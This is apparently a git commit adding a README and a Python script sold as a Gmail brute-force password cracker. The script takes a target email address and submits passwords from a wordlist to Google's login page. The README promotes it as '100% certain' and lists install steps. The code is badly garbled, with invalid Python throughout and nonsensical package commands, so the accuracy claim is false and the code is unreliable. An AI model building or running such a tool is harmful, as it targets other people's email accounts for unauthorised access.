bd2c93fa9c7c87b0171ea5a1d4225927c75736b2
Cybernetics <79071277+shade234sherif@users.noreply.github.com>
2022-08-08 12:35:27 +0100

    Add files via upload

--- README.md
+++ README.md
@@ -1,2 +1,66 @@
-# gsplinter
-G-MAIL BRUTE FORCE HACK
+# G SPLINTER ( GOOGLE MAIL CRACKER)
+
+Google mail cracker is another software coded by cybernetics
+The tool is written in the latest version of python (3.10), plus the latest modules.
+Python 3.10 was released on 2nd of august 2022, while this tool was uploaded on the 8th august 2022.
+Request and https modules are at the latest version... Efficiency and Accuracy is 100% certain.</br>
+Use this tool for legal hacking and educational purposes only </br>
+Free for all🙂....ENJOY
+
+
+
+
+## Installation procedure for android terminals( TERMUX )
+```
+>> apt update
+>> pkg upgrade
+>> pkg install python
+>> pip install python2
+>> pkg install python3 
+>> pkg install ast
+>> pkg install mechanize
+>> pkg install response
+>> pip3 install requirements.txt
+>> pkg install git
+>> git clone https://github.com/shade234sherif/gsplinter
+>> cd gsplinter
+>> python3 splint.py
+
+```
+## Installation for kali
+```
+* sudo git clone https://github.com/shade234sherif/gsplinter
+* cd gsplinter
+* python3 splint.py
+```
+
+## Features
+* Main menu
+* Network connection test
+* Date and time
+* Developer contact 
+
+
+
+## Protection Against Attacker
+* Do not give out / showcase your mail address to strangers 
+* Avoid suspicious login on fake campaign sites
+* Make use of browser that block site ads while browsing the internet
+* Use a secure DNS 
+* Avoid using the a mail service while on a public network 
+* Avoid mail submission/login on suspicious webpages.  
+
+## Explore More in Hacking ...
+* Blog site : https://cyberhacks.science.blog
+
+
+## Connect with me
+
+* https://facebook.com/cyberhacks6
+* whatsapp : +234 9155558315
+* FB MAIN ACC : https://facebook.com/shade234sherif
+
+~~~
+Happy hacking (Just For Fun).
+                                          CYBERNETICS  -  C7B3RN3TI6
+~~~
---
+++ splint.py
@@ -0,0 +1,140 @@
+import ast
+from ast import Try, ExceptHandler , If , Break, excepthandler
+from http.client import responses
+from ssl import HAS_SSLv2 
+import mechanize 
+from math import pi
+import numbers 
+import response
+import fileinput
+import datetime
+import sys
+
+if sys.version_info[0] !=3:
+    print('please install the latest python before running the programme')
+    print('pkg install python3')
+    sys.exit()
+print("""\033[1;32m
+  _|_|_|                 _|      _|   _|_|_|_|   _|      _|   _|    _|  
+ _|                      _|_|  _|_|   _|         _|_|    _|   _|    _|  
+ _|  _|_|   _|_|_|_|_|   _|  _|  _|   _|_|_|     _|  _|  _|   _|    _|  
+ _|    _|                _|      _|   _|         _|    _|_|   _|    _|  
+   _|_|_|                _|      _|   _|_|_|_|   _|      _|     _|_|    
+    \033[1;32m""")
+print("""\033[1;33m                                                                        
+[*]CODED BY : CYBERNETICS
+[*]TEAM : ALONE
+[*]WEB TAG : shade234sherif          
+[*]NOTICE : MAX VERSION UPDATE: 31st AUGUST 2022                                                             
+\033[1;0m""")
+print("\033[2;32m..\n.. \033[2;32m")
+
+answer=True
+while answer:
+    print("[1] START TOOL")
+    print("[2] NET CONNECTION TEST")
+    print("[3] CONTACT THE DEVELOPER")
+    print("[4] EXIT")
+    answer=input("OPTION:")
+    if answer =="1":
+        print('\033[1;36m  ________    ___________________ .____     .___  _______   ________________________________  \033[1;36m')
+        print('\033[1;36m /  _____/   /   _____/\______   \|    |    |   | \      \  \__    ___/\_   _____/\______   \ \033[1;36m')
+        print('\033[1;36m/   \  ___   \_____  \  |     ___/|    |    |   | /   |   \   |    |    |    __)_  |       _/ \033[1;36m') 
+        print('\033[1;36m\    \_\  \  /        \ |    |    |    |___ |   |/    |    \  |    |    |        \ |    |   \ \033[1;36m')
+        print('\033[1;36m \______  / /_______  / |____|    |_______ \|___|\____|__  /  |____|   /_______  / |____|_  / \033[1;36m')
+        print('\033[1;36m        \/          \/                    \/             \/                    \/         \/  \033[1;00m')
+
+        Try
+        import tokenize
+        ExceptHandler
+        print("TO CONTINUE\nplease intall tokenize",end='*')
+        sys.exit()
+
+        input = ("enter any key to continue: ")
+
+        Break;
+        mail = input("Enter target mail address: ")
+
+        import mechanize
+
+        web = mechanize.Browser()
+
+        url = "https://accounts.google.com"
+        header = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
+        web.addheaders = [('User-agent',header)]
+        web.open(url)
+        Try 
+        If; response; code = 200
+        web.set_handler_redirect(True)
+        web.set_handler_robots(False)
+        web.set_handler_gzip(False)
+        web.set_handler_redirect(True)
+
+
+
+        web.select_form(nr=0)
+
+        web.form['Email or phone'] = mail
+
+        response = web.submit()
+        response_data = response.r()
+
+        if "Enter your password" in response_data:
+           print("MAIL ADDRESS FOUND🦉")
+        else: 
+           print('\033[1;31mMAIL ADDRESS NOT FOUND\033[1;00m') 
+
+        file=open('pass.txt','r')
+
+        i=0
+        while file:
+                file=open('pass.txt','o','r')
+                password=file.readline().strip()
+        i=+1
+        if length(password) < 11:
+           continue
+        print=str(i) + " : ",password
+    
+
+        Try
+        web.select_form(nr=0)
+
+        web.form['Enter your password']= password
+        response = web.submit()
+        response_data = response.r()
+        'Add a home address' in response_data or 'Add or confirm your recovery mail or phone number' in response_data;
+        print("your password is: ",password)
+        sys.exit()
+
+    elif answer=="2":
+        import mechanize
+        test = mechanize.Browser()
+        ourl='https://github.com/shade234sherif'
+        header='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
+        test.open(ourl)
+        Try
+        If; response; code=200
+        print('NETWORK CONNECTION IS GOOD - TIME CAPTURED')
+        now = datetime.datetime.now()
+        print(now.strftime('%y-%m-%d %H : %M : %S'))
+
+    elif answer=="3": 
+        print('\033[1;33mCONTACT THE DEVELOPER USING THE SOCIAL LINKS PROVIDED BELOW\033[1;32m')
+        print('FACEBOOK PAGE: https://facebook.com/cyberhacks6')
+        print("")
+        print('FACEBOOK MAIN ACC : https://facebook.com/shade234sherif')
+        print("")
+        print('GITHUB: https://github.com/shade234sherif')
+        print("")
+        print("WHATSAPP : +234 9155558315")
+        print("")
+
+    elif answer=="4":
+        print("HAPPY HACKING")
+        print("FOLLOW ME ON GITHUB FOR MORE : https://github.com/shade234sherif\n BYE")
+        break
+
+    elif answer!="":
+        Break
+        print("\033[2;31mINVALID OPTION PROVIDED\n TRY AGAIN\033[2;32m")
+        
